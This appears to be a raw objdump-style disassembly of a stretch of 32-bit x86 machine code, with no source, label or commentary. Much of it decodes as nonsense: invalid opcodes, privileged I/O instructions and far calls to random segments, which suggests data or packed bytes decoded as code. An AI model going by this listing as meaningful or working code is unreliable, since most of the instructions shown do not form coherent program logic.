  42fb27:	dec    ebx
  42fb28:	ss pop ecx
  42fb2a:	or     eax,0x4c862ddd
  42fb2f:	add    dh,BYTE PTR ds:0x8380d9cb
  42fb35:	cli    
  42fb36:	mov    ebx,eax
  42fb38:	neg    BYTE PTR [ebp-0x18]
  42fb3b:	sbb    eax,0x8db64b55
  42fb40:	pop    ebx
  42fb41:	sahf   
  42fb42:	ins    DWORD PTR es:[edi],dx
  42fb43:	add    dh,BYTE PTR [edi+0x643d0db8]
  42fb49:	in     eax,dx
  42fb4a:	jp     0x42fad1
  42fb4c:	xlat   BYTE PTR ds:[ebx]
  42fb4d:	sbb    DWORD PTR [eax],0x958c9696
  42fb53:	outs   dx,DWORD PTR ds:[esi]
  42fb54:	(bad)  
  42fb55:	cmp    al,0xaa
  42fb57:	lock lds ecx,FWORD PTR [esi-0x4e]
  42fb5b:	xlat   BYTE PTR ds:[ebx]
  42fb5c:	int3   
  42fb5d:	mov    eax,0xc35b6de1
  42fb62:	ds pop ebp
  42fb64:	mov    ds:0x3fadbb5b,al
  42fb69:	popf   
  42fb6a:	mov    ecx,0x4fcd65ce
  42fb6f:	out    0xbf,al
  42fb71:	lock pop ds
  42fb73:	pushf  
  42fb74:	sbb    ebp,DWORD PTR [ecx+0x1]
  42fb77:	mov    ecx,0x80563ef2
  42fb7c:	enter  0x614a,0x71
  42fb80:	fnstenv [esi+0x4698ff53]
  42fb86:	ins    BYTE PTR es:[edi],dx
  42fb87:	mov    dh,0x4a
  42fb89:	js     0x42fbb1
  42fb8b:	pop    ebx
  42fb8c:	mov    esp,0x74054c26
  42fb91:	aam    0x63
  42fb93:	inc    ebx
  42fb94:	aas    
  42fb95:	jg     0x42fbe8
  42fb97:	jle    0x42fb83
  42fb99:	out    dx,al
  42fb9a:	hlt    
  42fb9b:	sbb    bh,BYTE PTR [edi+ecx*1+0x4654df06]
  42fba2:	dec    edi
  42fba3:	mov    bh,0xd3
  42fba5:	jno    0x42fbb3
  42fba7:	adc    BYTE PTR [esi-0x141acf5b],al
  42fbad:	mov    ch,0x32
  42fbaf:	(bad)  [esi-0x69]
  42fbb2:	scas   al,BYTE PTR es:[edi]
  42fbb3:	adc    al,0xf1
	...
  42fc15:	add    BYTE PTR [ebx],cl
  42fc17:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc1d:	call   0x8fc7:0x9e5607ea
  42fc24:	rcr    esp,0xc
  42fc27:	add    BYTE PTR [edx],al
  42fc29:	add    BYTE PTR [edi],al
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR [edi+0x7562c32],bh
  42fc33:	int3   
  42fc34:	sbb    eax,0x945c51cf
  42fc39:	fstp   st(0)
  42fc3b:	lock mov WORD PTR [ebx-0x65b6e688],?
  42fc42:	xor    al,0x45
  42fc44:	lds    ecx,FWORD PTR [eax-0x36c9d297]
  42fc4a:	ficomp WORD PTR [edi-0x4a]
  42fc4d:	mov    ch,0x9c
  42fc4f:	call   0x9b68:0xe347165d
  42fc56:	xor    ebx,eax
  42fc58:	loopne 0x42fca8
  42fc5a:	std    
  42fc5b:	idiv   DWORD PTR [ebx-0x73944e2]
  42fc61:	and    esi,DWORD PTR [ecx-0x4e]
  42fc64:	mov    edx,0x89bd37b1
  42fc69:	xor    BYTE PTR [edi+0x2f4f90f2],0xd1
  42fc70:	sahf   
  42fc71:	push   edi
  42fc72:	dec    esi
  42fc73:	pop    edi
  42fc74:	aad    0xf7
  42fc76:	cmp    BYTE PTR [edi],0x23
  42fc79:	lea    ecx,[edi+0x31230347]
  42fc7f:	dec    eax
  42fc80:	dec    ebx
  42fc81:	scas   al,BYTE PTR es:[edi]
  42fc82:	loop   0x42fc18
  42fc84:	and    ebp,DWORD PTR [ecx-0x4]
  42fc87:	test   edi,ebx
  42fc89:	(bad)  
  42fc8a:	lods   eax,DWORD PTR ds:[esi]
  42fc8b:	(bad)  
  42fc8c:	cmp    bl,BYTE PTR [edx]
  42fc8e:	int    0x67
  42fc90:	inc    ecx
  42fc91:	daa    
  42fc92:	loopne 0x42fce2
  42fc94:	jmp    0x806d:0x55215e45
  42fc9b:	loope  0x42fd17
  42fc9d:	das    
  42fc9e:	pop    ebp
  42fc9f:	add    al,0xc5
  42fca1:	ret    
  42fca2:	sahf   
  42fca3:	adc    al,0x3a
  42fca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fca6:	imul   BYTE PTR [edi]
  42fca8:	call   0x99f2b863
  42fcad:	and    BYTE PTR [ecx-0x6bcf5758],ah
  42fcb3:	jl     0x42fcdd
  42fcb5:	gs push edx
  42fcb7:	sbb    DWORD PTR [ecx+0x39bd181a],0x59
  42fcbe:	int3   
  42fcbf:	or     BYTE PTR [edx-0x5aaafa14],cl
  42fcc5:	(bad)  
  42fcc6:	push   0x7d292189
  42fccb:	stc    
  42fccc:	fist   DWORD PTR [edi+0x27a074b]
  42fcd2:	xor    esp,DWORD PTR [esi+0x463988f0]
  42fcd8:	cmp    edx,DWORD PTR [edx]
  42fcda:	aas    
  42fcdb:	fmul   st(3),st
  42fcdd:	mov    edi,0x49eb07d4
  42fce2:	pop    ds
  42fce3:	mov    al,0x16
  42fce5:	or     ebp,DWORD PTR [eax+ecx*4+0x4972a6b7]
  42fcec:	inc    ebx
  42fced:	jbe    0x42fcdc
  42fcef:	stc    
  42fcf0:	mov    ds:0x2af08448,eax
  42fcf5:	jl     0x42fcb3
  42fcf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fcf8:	outs   dx,DWORD PTR ds:[esi]
  42fcf9:	in     eax,dx
  42fcfa:	stos   DWORD PTR es:[edi],eax
  42fcfb:	mov    WORD PTR [ecx-0x753ded21],ss
  42fd01:	inc    ebx
  42fd02:	rcl    DWORD PTR [edi+0x28],0x82
  42fd06:	fwait
  42fd07:	pop    edx
  42fd08:	or     eax,0xb4eb17c9
  42fd0d:	sub    dh,BYTE PTR [edx+ebx*1+0x6ceba24b]
  42fd14:	test   BYTE PTR [ebp+0xc462abd],cl
  42fd1a:	jge    0x42fd6d
  42fd1c:	(bad)  
  42fd1d:	and    eax,0x55b7237e
  42fd22:	out    0x56,al
  42fd24:	dec    edx
  42fd25:	mov    ebx,0x271fb187
  42fd2a:	cmp    DWORD PTR [edi+eiz*8],ecx
  42fd2d:	pusha  
  42fd2e:	fbld   TBYTE PTR [ebx+edi*1-0x4826ef15]
	...
  42fd95:	add    BYTE PTR [eax-0x40],cl
  42fd98:	ret    0xcaf0
  42fd9b:	bnd jp 0x42fd96
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0xd3
  42fda3:	scas   eax,DWORD PTR es:[edi]
  42fda4:	pop    es
  42fda5:	(bad)  
  42fda6:	adc    eax,DWORD PTR [ecx]
  42fda8:	add    al,BYTE PTR [eax]
  42fdaa:	pop    es
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    bh,bh
  42fdaf:	bound  ecx,QWORD PTR [edi-0x64]
  42fdb2:	or     ebx,edx
  42fdb4:	mov    esi,0x9730bef9
  42fdb9:	js     0x42fdb4
  42fdbb:	fdivr  DWORD PTR [edx]
  42fdbd:	jle    0x42fdb6
  42fdbf:	outs   dx,BYTE PTR ds:[esi]
  42fdc0:	loop   0x42fde7
  42fdc2:	arpl   WORD PTR [ecx-0x4ac484c5],bp
  42fdc8:	pop    edi
  42fdc9:	lds    edi,FWORD PTR [edi-0x3a]
  42fdcc:	dec    ebx
  42fdcd:	push   ax
  42fdcf:	fs fs call 0x89cc:0x71154af1
  42fdd8:	into   
  42fdd9:	cmp    esi,ebx
  42fddb:	fnstcw WORD PTR [ecx]
  42fddd:	in     al,0x90
  42fddf:	mov    dh,0x1b
  42fde1:	outs   dx,DWORD PTR ds:[esi]
  42fde2:	loopne 0x42fde4
  42fde4:	pushf  
  42fde5:	leave  
  42fde6:	int    0x9b
  42fde8:	je     0x42fd90
  42fdea:	sbb    bl,0xda
  42fded:	(bad)  
  42fdee:	push   edx
  42fdef:	pusha  
  42fdf0:	clc    
  42fdf1:	add    al,0x84
  42fdf3:	aam    0x4a
  42fdf5:	push   0xac6d712e
  42fdfa:	jnp    0x42fd7e
  42fdfc:	mov    ds:0x194fefde,eax
  42fe01:	and    DWORD PTR [esp+edi*8-0x3d],edx
  42fe05:	stos   DWORD PTR es:[edi],eax
  42fe06:	mov    WORD PTR [ecx+0xe530b55],fs
  42fe0c:	pop    ebx
  42fe0d:	stos   BYTE PTR es:[edi],al
  42fe0e:	xlat   BYTE PTR ds:[ebx]
  42fe0f:	pushf  
  42fe10:	xor    al,0x52
  42fe12:	inc    ebp
  42fe13:	frstor [esi-0x45]
  42fe16:	ss push edi
  42fe18:	lods   eax,DWORD PTR ds:[esi]
  42fe19:	pusha  
  42fe1a:	loop   0x42fdae
  42fe1c:	push   ebx
  42fe1d:	das    
  42fe1e:	inc    edi
  42fe1f:	mov    eax,ds:0x466dc898
  42fe24:	daa    
  42fe25:	test   BYTE PTR [bp+di+0x3521],al
  42fe2a:	and    al,dl
  42fe2c:	sahf   
  42fe2d:	mov    gs,ebp
  42fe2f:	int3   
  42fe30:	shl    BYTE PTR [edx-0x3b00f853],0x63
  42fe37:	xchg   ecx,eax
  42fe38:	(bad)  
  42fe39:	repnz int3 
  42fe3b:	aad    0xd9
  42fe3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe3e:	xor    eax,0xdff58751
  42fe43:	loopne 0x42fe4b
  42fe45:	scas   al,BYTE PTR es:[edi]
  42fe46:	imul   esi,esi,0xadd60ba5
  42fe4c:	jns    0x42fe32
  42fe4e:	popa   
  42fe4f:	les    ebx,FWORD PTR [esp+ecx*8]
  42fe52:	rol    DWORD PTR [eax],0xc6
  42fe55:	fisttp QWORD PTR [ebp+0x74]
  42fe58:	test   DWORD PTR ds:0x8b97f11e,ebp
  42fe5e:	mov    WORD PTR [eax],ss
  42fe60:	push   es
  42fe61:	div    BYTE PTR [edx-0x1437e6d0]
  42fe67:	push   es
  42fe68:	ja     0x42feaf
  42fe6a:	mov    eax,ds:0x7ba0c48f
  42fe6f:	add    BYTE PTR [edi+0x14],bl
  42fe72:	push   0xffffffed
  42fe74:	add    esp,edx
  42fe76:	(bad)  
  42fe77:	and    BYTE PTR [edx-0x26],dl
  42fe7a:	dec    ebp
  42fe7b:	aam    0xcf
  42fe7d:	jns    0x42feb2
  42fe7f:	xchg   ecx,eax
  42fe80:	adc    BYTE PTR [ecx-0x57],ah
  42fe83:	(bad)  
  42fe84:	mov    esi,0xac968953
  42fe89:	fld    DWORD PTR [edi+0x1d2ce2c3]
  42fe8f:	sub    edi,0xf85df806
  42fe95:	je     0x42fe7c
  42fe97:	sbb    eax,0x6632043
  42fe9c:	clc    
  42fe9d:	mov    edx,0xd2a30608
  42fea2:	pop    ebx
  42fea3:	cmp    ah,BYTE PTR [eax]
  42fea5:	cmp    BYTE PTR [edi],dh
  42fea7:	ret    0x6301
  42feaa:	xchg   edi,eax
  42feab:	scas   eax,DWORD PTR es:[edi]
  42feac:	mov    eax,ds:0xedbc2f55
  42feb1:	mov    al,0x3d
  42feb3:	or     ch,BYTE PTR [ebp+0x0]
	...
  42ff15:	add    BYTE PTR [edi+eiz*2],al
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	mov    eax,ds:0x1aee67f4
  42ff27:	add    al,BYTE PTR [edx]
  42ff29:	add    BYTE PTR [edi],al
  42ff2b:	add    DWORD PTR [eax],eax
  42ff2d:	add    dl,dh
  42ff2f:	push   es
  42ff30:	add    DWORD PTR [ebx+0x2a],esp
  42ff33:	popf   
  42ff34:	popf   
  42ff35:	in     al,0xa9
  42ff37:	jbe    0x42ff1e
  42ff39:	push   ecx
  42ff3a:	pop    esp
  42ff3b:	push   ecx
  42ff3c:	sbb    ecx,ebp
  42ff3e:	jle    0x42ff82
  42ff40:	pop    ss
  42ff41:	and    bh,BYTE PTR [ecx+0x61e7e50f]
  42ff47:	jno    0x42ffc3
  42ff49:	aad    0x6d
  42ff4b:	inc    esp
  42ff4c:	jbe    0x42ff1e
  42ff4e:	and    al,0xf6
  42ff50:	sti    
  42ff51:	cmp    edx,DWORD PTR [edx-0x132d9fef]
  42ff57:	dec    ecx
  42ff58:	into   
  42ff59:	dec    ebp
  42ff5a:	mov    bh,0x76
  42ff5c:	sbb    BYTE PTR [esi+edi*2-0x74],al
  42ff60:	xchg   edx,eax
  42ff61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff62:	retf   0x7703
  42ff65:	push   ebp
  42ff66:	mov    ds:0xdc82b1fb,eax
  42ff6b:	xor    cl,BYTE PTR [eax-0x2657e018]
  42ff71:	jp     0x42fefd
  42ff73:	push   ebx
  42ff74:	jle    0x42ff40
  42ff76:	test   DWORD PTR [edi+esi*8+0x7f9f2629],esp
  42ff7d:	outs   dx,BYTE PTR ds:[esi]
  42ff7e:	clc    
  42ff7f:	sub    DWORD PTR [ebx+edx*4],esi
  42ff82:	inc    esi
  42ff83:	pusha  
  42ff84:	scas   eax,DWORD PTR es:[edi]
  42ff85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ff86:	xchg   ebx,eax
  42ff87:	dec    eax
  42ff88:	push   esi
  42ff89:	and    al,0xc5
  42ff8b:	dec    ecx
  42ff8c:	push   0x15
  42ff8e:	mov    al,0x29
  42ff90:	mov    edx,0x267eac09
  42ff95:	sub    BYTE PTR [esp+esi*2+0xd],dh
  42ff99:	aas    
  42ff9a:	or     cl,ch
  42ff9c:	arpl   WORD PTR [ecx],bp
  42ff9e:	addr16 je 0x42ffcb
  42ffa1:	aaa    
  42ffa2:	mov    ah,BYTE PTR [esi+0x24]
  42ffa5:	add    BYTE PTR [ebx+0x48296e32],ah
  42ffab:	xor    ebp,DWORD PTR [eax+0x21]
  42ffae:	rcl    BYTE PTR [edi+0x6e],1
  42ffb1:	mov    ds:0xc0078463,eax
  42ffb6:	adc    eax,0xc1c2c658
  42ffbb:	mov    edx,0x4eb3ee1d
  42ffc0:	retf   0xe1bb
  42ffc3:	call   0x5336cb0e
  42ffc8:	and    esp,DWORD PTR [esi+0x6d]
  42ffcb:	add    DWORD PTR [edx-0x18],ecx
  42ffce:	xor    BYTE PTR [ebx],dh
  42ffd0:	test   eax,0xa85dd4f5
  42ffd5:	jg     0x42ff86
  42ffd7:	sub    dl,BYTE PTR [esi-0x4c]
  42ffda:	ja     0x430035
  42ffdc:	hlt    
  42ffdd:	outs   dx,DWORD PTR ds:[esi]
  42ffde:	add    DWORD PTR [ebx],esp
  42ffe0:	xor    ch,ah
  42ffe2:	leave  
  42ffe3:	sar    DWORD PTR [ecx+0x47],0xaa
  42ffe7:	shl    esp,cl
  42ffe9:	aaa    
  42ffea:	sbb    eax,0x665ce34f
  42ffef:	ret    
  42fff0:	cmp    al,dh
  42fff2:	push   0xffffffe0
  42fff4:	or     eax,DWORD PTR [ebx+0x4e04d39]
  42fffa:	leave  
  42fffb:	push   es
  42fffc:	outs   dx,DWORD PTR ds:[esi]
  42fffd:	jnp    0x43001d
  42ffff:	(bad)  
  430000:	xchg   edx,eax
  430001:	les    ebx,FWORD PTR [ebp+ebp*1+0x6a3c725f]
  430008:	int3   
  430009:	add    edi,DWORD PTR [esi]
  43000b:	sub    BYTE PTR [edi+0x47],bl
  43000e:	cmc    
  43000f:	adc    esp,ebx
  430011:	jg     0x42ff98
  430013:	sub    al,0xe6
  430015:	jne    0x430042
  430017:	adc    eax,0x3c4cdff6
  43001c:	lods   eax,DWORD PTR ds:[esi]
  43001d:	(bad)  [edx]
  43001f:	stos   DWORD PTR es:[edi],eax
  430020:	sbb    ch,BYTE PTR [edi-0x14]
  430023:	sbb    eax,0xc0378e0d
  430028:	aam    0x2c
  43002a:	ins    BYTE PTR es:[edi],dx
  43002b:	push   ebp
  43002c:	mov    dh,0x3c
  43002e:	push   cs
  43002f:	dec    ecx
  430030:	js     0x4300ab
  430032:	scas   eax,DWORD PTR es:[edi]
  430033:	jno    0x42ffd8
	...
  430095:	add    bh,al
  430097:	ins    DWORD PTR es:[edi],dx
  430098:	aam    0xb5
  43009a:	(bad)  
  43009b:	mov    ebp,0x87aa7fe7
  4300a0:	mov    bl,0x9f
  4300a2:	dec    ebx
  4300a3:	sbb    eax,0x32169cc
  4300a8:	add    al,BYTE PTR [eax]
  4300aa:	daa    
  4300ab:	add    BYTE PTR [eax],al
  4300ad:	add    BYTE PTR [ebx+0x418885e0],bh
  4300b3:	ins    BYTE PTR es:[edi],dx
  4300b4:	ss ss mov fs,ebp
  4300b8:	bound  eax,QWORD PTR [edi]
  4300ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4300bb:	and    eax,0x9d1f9820
  4300c0:	cmp    al,al
  4300c2:	sub    al,0x0
  4300c4:	sbb    DWORD PTR [ecx],esp
  4300c6:	push   ecx
  4300c7:	jg     0x430076
  4300c9:	repz pop esi
  4300cb:	fst    QWORD PTR [esi-0x33]
  4300ce:	icebp  
  4300cf:	mov    al,0xc
  4300d1:	mov    edi,0x70649
	...
  430116:	dec    ebp
  430117:	push   ebp
  430118:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43011e:	mov    esp,ebp
  430120:	or     al,ah
  430122:	dec    ebp
  430123:	add    bh,al
  430125:	add    BYTE PTR [eax],cl
  430127:	add    BYTE PTR [eax],al
  430129:	mov    DWORD PTR [eax],0x3ef44545
  43012f:	xor    eax,0x9c8b8500
  430134:	hlt    
  430135:	clc    
  430136:	retf   
  430137:	(bad)  
  430138:	enter  0x4d45,0xb8
  43013c:	mov    esi,DWORD PTR [esp+esi*8]
  43013f:	test   ebx,ecx
  430141:	pushf  
  430142:	enter  0x4df8,0x8b
  430146:	mov    DWORD PTR [ebp+0x8],0x894708
  43014d:	inc    ebp
  43014e:	mov    ebp,0xff8bfffc
  430153:	dec    ebp
  430154:	mov    ch,0xf4
  430156:	call   DWORD PTR [ebx-0x1]
  430159:	mov    ebx,0x8005322
  43015e:	call   DWORD PTR [ecx+0x8]
  430161:	pop    es
  430162:	jmp    0xb8:0x9cb4533
  430169:	call   0xc3:0x32f4728b
  430170:	call   0x8989:0x3c83203
  430177:	dec    ebp
  430178:	or     ah,al
  43017a:	inc    ebp
  43017b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430181:	xor    eax,DWORD PTR [eax]
  430183:	retf   
  430184:	ret    
  430185:	add    eax,esi
  430187:	enter  0x8945,0x64
  43018b:	dec    ebp
  43018c:	sbb    ah,cl
  43018e:	add    BYTE PTR [ebx-0xb87b277],cl
  430194:	dec    DWORD PTR [ebx-0xbcfb275]
  43019a:	test   DWORD PTR [ebx],esi
  43019c:	dec    ebx
  43019e:	inc    DWORD PTR [ebx]
  4301a0:	inc    eax
  4301a1:	enter  0x8989,0x64
  4301a5:	(bad)  
  4301a6:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4301aa:	cld    
  4301ab:	dec    DWORD PTR [ebp-0xa90001]
  4301b1:	push   edi
  4301b2:	mov    BYTE PTR [edx+0x1],ch
  4301b5:	and    BYTE PTR [eax],al
  4301b7:	pop    ecx
  4301b8:	inc    ebp
  4301b9:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4301bf:	push   0xffffff89
  4301c1:	pop    ecx
  4301c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301c3:	dec    ebp
  4301c4:	add    BYTE PTR [ecx+0x45fc088b],cl
  4301ca:	jne    0x430214
  4301cc:	lea    eax,[eax]
  4301ce:	fs (bad) 
  4301d0:	dec    DWORD PTR [eax]
  4301d2:	mov    DWORD PTR [eax],eax
  4301d4:	test   al,0x0
  4301d6:	add    BYTE PTR [ebp-0x18],cl
  4301d9:	xor    ebp,DWORD PTR [edx]
  4301db:	add    eax,DWORD PTR [eax]
  4301dd:	mov    eax,eax
  4301df:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301e6:	inc    ebp
  4301e7:	mov    DWORD PTR [ebx+0x459408],ecx
  4301ed:	popa   
  4301ee:	mov    esp,DWORD PTR [ebp-0x75]
  4301f1:	(bad)  
  4301f2:	cld    
  4301f3:	inc    eax
  4301f4:	cmp    bh,0x1
  4301f7:	lea    eax,[eax]
  4301f9:	and    BYTE PTR [eax],al
  4301fb:	inc    DWORD PTR [ecx-0x18]
  4301fe:	mov    ecx,DWORD PTR [ebx]
  430200:	cld    
  430201:	add    BYTE PTR [ecx+0x75014d],cl
  430207:	(bad)  
  430208:	xchg   ebp,eax
  430209:	sar    bh,1
  43020b:	inc    eax
  43020c:	inc    DWORD PTR [eax]
  43020e:	mov    eax,DWORD PTR [ebp-0x4]
  430211:	xor    edx,DWORD PTR [edx+0x7201be]
  430217:	add    BYTE PTR [edx],dl
  430219:	(bad)  
  43021a:	nop
  43021b:	inc    ebp
  43021c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  430222:	mov    al,0xff
  430224:	add    bh,bh
  430226:	add    BYTE PTR [ebx],dh
  430228:	inc    DWORD PTR [ebx]
  43022a:	sbb    al,0x89
  43022c:	jne    0x43020a
  43022e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430234:	mov    eax,DWORD PTR [ebp-0xff0048]
  43023a:	mov    DWORD PTR [eax-0x70],0xee70e989
  430241:	inc    DWORD PTR [ebp-0x75]
  430244:	(bad)  [esp+ebp*8]
  430247:	test   DWORD PTR [esi-0x1],esp
  43024a:	inc    ebp
  43024b:	(bad)  
  43024c:	aas    
  43024d:	inc    ebp
  43024e:	(bad)  
  43024f:	lea    edi,[eax+edi*2-0x1]
  430253:	inc    edi
  430255:	mov    DWORD PTR [ecx],edi
  430257:	mov    al,ds:0x8b8000c7
  43025c:	out    dx,al
  43025d:	cld    
  43025e:	loopne 0x4301ed
  430260:	inc    ebp
  430261:	(bad)  
  430262:	in     al,dx
  430263:	(bad)  
  430264:	fisttp WORD PTR [eax+0x8801c7]
  43026a:	jecxz  0x4302b1
  43026c:	out    dx,al
  43026d:	inc    DWORD PTR [ebp-0x4]
  430270:	out    0x8d,eax
  430272:	aas    
  430273:	(bad)  
  430274:	call   0xcb2d78
  430279:	add    DWORD PTR [ebx-0x7f590400],ecx
  43027f:	add    BYTE PTR [ecx],al
  430281:	test   DWORD PTR [eax],eax
  430283:	wrmsr  
  430285:	jae    0x430272
  430287:	add    BYTE PTR [eax],al
  430289:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43028f:	add    esp,edi
  430291:	add    BYTE PTR [eax+0x450108],al
  430297:	mov    edi,DWORD PTR [ebp-0x6c]
  43029a:	add    DWORD PTR [eax],0x4
  43029d:	mov    eax,DWORD PTR [ebp+0x3]
  4302a0:	mov    edi,DWORD PTR [esp+edi*8]
  4302a3:	dec    ebp
  4302a4:	nop
  4302a5:	mov    eax,DWORD PTR [ecx]
  4302a7:	fadd   DWORD PTR [eax]
  4302a9:	add    BYTE PTR [ecx*4-0xafa000],al
  4302b0:	inc    ebp
  4302b1:	push   edx
  4302b2:	call   DWORD PTR [ebp-0x7b]
  4302b5:	mov    esi,DWORD PTR [ebp-0x74]
  4302b8:	mov    eax,DWORD PTR [eax]
  4302ba:	cld    
  4302bb:	mov    eax,DWORD PTR [eax+0x880103]
  4302c1:	add    BYTE PTR [ebp+0x6a],bh
  4302c4:	cmp    edi,0x10
  4302c7:	mov    WORD PTR [ebp+0x0],es
  4302ca:	mov    edx,DWORD PTR [edx-0x4]
  4302cd:	push   ecx
  4302ce:	nop
  4302cf:	inc    DWORD PTR [ecx]
  4302d1:	cld    
  4302d2:	add    BYTE PTR [ebp-0x26],bh
  4302d5:	mov    eax,DWORD PTR [eax]
  4302d7:	cld    
  4302d8:	push   eax
  4302d9:	nop
  4302da:	inc    ebp
  4302db:	add    edi,edi
  4302dd:	add    BYTE PTR [ebx+0x4de0f445],cl
  4302e3:	call   0x9446ca1b
  4302e8:	cmp    esp,ebx
  4302ea:	movntq QWORD PTR [esi],mm6
  4302ed:	mov    DWORD PTR [eax],0xb87c8b98
  4302f3:	test   ebx,eax
  4302f5:	jmp    DWORD PTR [esi-0x1]
  4302f8:	int    0xe9
  4302fa:	sub    esp,esp
  4302fc:	add    eax,DWORD PTR [ebp-0x30]
  4302ff:	fild   WORD PTR [ebp+0x3f]
  430302:	cmp    eax,edi
  430304:	je     0xc243e726
  43030a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430311:	(bad)  
  430312:	jne    0x4302a0
  430314:	mov    ebx,ecx
  430316:	cld    
  430317:	jl     0x43035e
  430319:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43031f:	inc    ebp
  430320:	call   0xeb2cb0
  430325:	add    BYTE PTR [ebx-0x7f170301],cl
  43032b:	add    DWORD PTR es:[eax],eax
  43032e:	add    al,al
  430330:	xor    BYTE PTR [eax+0x3f],dl
  430333:	inc    ebp
  430334:	add    BYTE PTR [ebx+0xfcd88b],cl
  43033a:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430340:	add    DWORD PTR [ecx+0x458be845],ecx
  430346:	fmul   DWORD PTR [ebx+0x8bb800]
  43034c:	cld    
  43034d:	call   0xd82e12
  430352:	dec    DWORD PTR [ebx+0x108ee8ff]
  430358:	add    al,al
  43035a:	push   eax
  43035b:	es inc ebp
  43035d:	inc    ebp
  43035e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430364:	dec    DWORD PTR [ebx-0x3ff70301]
  43036a:	mov    DWORD PTR gs:[eax],eax
  43036d:	call   0x8b6b4932
  430372:	inc    ebp
  430373:	mov    eax,0xe8d8008b
  430378:	add    BYTE PTR [ecx],ch
  43037a:	mov    eax,DWORD PTR [eax]
  43037c:	cld    
  43037d:	mov    eax,eax
  43037f:	call   0x462b13d9
  430384:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43038a:	cld    
  43038b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430392:	xor    BYTE PTR [eax],al
  430394:	push   edi
  430395:	inc    ebp
  430396:	mov    DWORD PTR [ebx],esi
  430398:	in     al,0xb9
  43039a:	inc    ebp
  43039b:	lea    ecx,[ebx-0x3c370301]
  4303a1:	dec    ebp
  4303a2:	call   0x8dc1:0x308328b
  4303a9:	xchg   DWORD PTR [eax+0x1],eax
  4303ac:	inc    DWORD PTR [eax]
  4303ae:	call   0x432cf8
  4303b3:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4303b9:	jge    0x4303ee
  4303bb:	mov    eax,DWORD PTR [ebx]
  4303bd:	cld    
  4303be:	lea    edx,[eax+0xff0120]
  4303c4:	call   0x432d56
  4303c9:	push   eax
  4303ca:	inc    DWORD PTR [ebp-0x1c]
  4303cd:	mov    ecx,DWORD PTR [ebp-0x58]
  4303d0:	xor    eax,DWORD PTR [eax]
  4303d2:	add    edi,edi
  4303d4:	cmp    ebp,eax
  4303d6:	jne    0x4303fe
  4303d8:	mov    DWORD PTR [eax],0x8b004dd8
  4303de:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4303e5:	mov    eax,ebx
  4303e7:	cld    
  4303e8:	test   BYTE PTR [eax+0x32019a],bh
  4303ee:	mov    DWORD PTR [ebp+0x8],esi
  4303f1:	xor    eax,DWORD PTR [ebp-0x73]
  4303f4:	test   DWORD PTR [esp+esi*2-0x1],edi
  4303f8:	mov    ebp,eax
  4303fa:	mov    eax,0x33004d29
  4303ff:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430405:	add    DWORD PTR [eax],eax
  430407:	add    BYTE PTR [ebp+0x30],al
  43040a:	mov    edx,DWORD PTR [edi-0x48]
  43040d:	add    ebx,0xffffffe4
  430410:	test   bp,cx
  430413:	je     0x430440
  430415:	mov    eax,DWORD PTR [ebx]
  430417:	cld    
  430418:	sar    BYTE PTR [eax+0x3b0145],1
  43041e:	pcmpeqw mm4,mm6
  430421:	xor    edi,edi
  430423:	lea    ecx,[ebx-0x239e7470]
  430429:	add    BYTE PTR [ebp+0x50],cl
  43042c:	cmp    eax,DWORD PTR [ebp+0x75]
  43042f:	mov    ebp,DWORD PTR [eax-0x68]
  430432:	test   DWORD PTR [eax],eax
  430434:	clc    
  430435:	push   DWORD PTR [ebp-0x1]
  430438:	lea    ecx,[eax]
  43043a:	int3   
  43043b:	inc    ebp
  43043c:	call   0xfb34cc
  430441:	jne    0x43043b
  430443:	xor    edi,DWORD PTR [ebp-0x41]
  430446:	jmp    0x4304ba
  430448:	mov    eax,DWORD PTR [eax]
  43044a:	mov    eax,0x339545c7
  43044f:	inc    DWORD PTR [ebx]
  430451:	push   DWORD PTR [ecx]
  430453:	xor    eax,0x50eb008b
  430458:	mov    eax,DWORD PTR [ebp-0x3c]
  43045b:	mov    eax,eax
  43045d:	cld    
  43045e:	clc    
  43045f:	ret    
  430460:	test   bh,al
  430462:	pop    es
  430463:	xchg   ebp,eax
  430464:	add    bh,bh
  430466:	inc    ebp
  430467:	dec    DWORD PTR [edi]
  430469:	pop    ds
  43046a:	sub    eax,DWORD PTR [eax]
  43046c:	add    BYTE PTR [eax+0x76],dl
  43046f:	push   ebp
  430470:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  430476:	or     al,0xcf
  430478:	inc    eax
  430479:	enter  0x745,0x72
  43047d:	inc    ebp
  43047e:	mov    eax,DWORD PTR [ecx]
  430480:	int3   
  430481:	add    BYTE PTR [ebp-0x75],al
  430484:	xor    eax,0xc74d9cb8
  430489:	xor    edx,eax
  43048b:	lea    eax,[ebp+0x4572f808]
  430491:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430497:	fadd   st,st(6)
